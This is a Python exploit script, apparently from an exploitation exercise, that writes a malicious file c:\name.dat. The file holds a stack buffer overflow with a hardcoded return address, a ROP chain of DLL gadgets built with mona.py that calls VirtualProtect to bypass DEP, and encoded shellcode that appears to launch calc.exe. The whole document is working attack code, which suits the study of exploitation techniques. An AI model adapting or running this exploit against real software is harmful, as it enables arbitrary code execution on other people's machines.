import struct

# The signature of VirtualProtect is the following:
#   BOOL WINAPI VirtualProtect(
#     _In_   LPVOID lpAddress,
#     _In_   SIZE_T dwSize,
#     _In_   DWORD flNewProtect,
#     _Out_  PDWORD lpflOldProtect
#   );

# After PUSHAD is executed, the stack looks like this:
#   .
#   .
#   .
#   EDI (ptr to ROP NOP (RETN))          <---------------------------- current ESP
#   ESI (ptr to JMP [EAX] (EAX = address of ptr to VirtualProtect))
#   EBP (ptr to POP (skips EAX on the stack))
#   ESP (lpAddress (automatic))
#   EBX (dwSize)
#   EDX (NewProtect (0x40 = PAGE_EXECUTE_READWRITE))
#   ECX (lpOldProtect (ptr to writeable address))
#   EAX (address of ptr to VirtualProtect)
# lpAddress:
#   ptr to "call esp"
#   <shellcode>

msvcr120 = 0x6cf70000
kernel32 = 0x77120000
ntdll = 0x77630000

def create_rop_chain():
    for_edx = 0xffffffff

    # rop chain generated with mona.py - www.corelan.be (and modified by me).
    rop_gadgets = [
        msvcr120 + 0xbf868,  # POP EBP # RETN [MSVCR120.dll]
        msvcr120 + 0xbf868,  # skip 4 bytes [MSVCR120.dll]

        # ebx = 0x400 (dwSize)
        msvcr120 + 0x1c658,  # POP EBX # RETN [MSVCR120.dll]
        0x11110511,
        msvcr120 + 0xdb6c4,  # POP ECX # RETN [MSVCR120.dll]
        0xeeeefeef,
        msvcr120 + 0x46398,  # ADD EBX,ECX # SUB AL,24 # POP EDX # RETN [MSVCR120.dll]
        for_edx,

        # edx = 0x40 (NewProtect = PAGE_EXECUTE_READWRITE)
        msvcr120 + 0xbedae,  # POP EDX # RETN [MSVCR120.dll]
        0x01010141,
        ntdll + 0x75b23,     # POP EDI # RETN [ntdll.dll]
        0xfefefeff,
        msvcr120 + 0x39b41,  # ADD EDX,EDI # RETN [MSVCR120.dll]

        msvcr120 + 0xdb6c4,  # POP ECX # RETN [MSVCR120.dll]
        kernel32 + 0xe0fce,  # &Writable location [kernel32.dll]
        ntdll + 0x75b23,     # POP EDI # RETN [ntdll.dll]
        msvcr120 + 0x68e3d,  # RETN (ROP NOP) [MSVCR120.dll]
        msvcr120 + 0x6e150,  # POP ESI # RETN [MSVCR120.dll]
        ntdll + 0x2e8ae,     # JMP [EAX] [ntdll.dll]
        msvcr120 + 0x50464,  # POP EAX # RETN [MSVCR120.dll]
        msvcr120 + 0xe51a4,  # address of ptr to &VirtualProtect() [IAT MSVCR120.dll]
        msvcr120 + 0xbb7f9,  # PUSHAD # RETN [MSVCR120.dll]
        kernel32 + 0x37133,  # ptr to 'call esp' [kernel32.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def write_file(file_path):
    with open(file_path, 'wb') as f:
        ret_eip = kernel32 + 0xb7805            # RETN
        shellcode = (
            "\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02" +
            "\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa" +
            "\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8" +
            "\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02" +
            "\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45" +
            "\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6" +
            "\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c" +
            "\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0" +
            "\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53" +
            "\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45" +
            "\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2" +
            "\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b" +
            "\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff" +
            "\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0" +
            "\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75" +
            "\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d" +
            "\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c" +
            "\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24" +
            "\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04" +
            "\x30\x03\xc6\xeb\xdd")
        name = 'a'*36 + struct.pack('<I', ret_eip) + create_rop_chain() + shellcode
        f.write(name)

write_file(r'c:\name.dat')
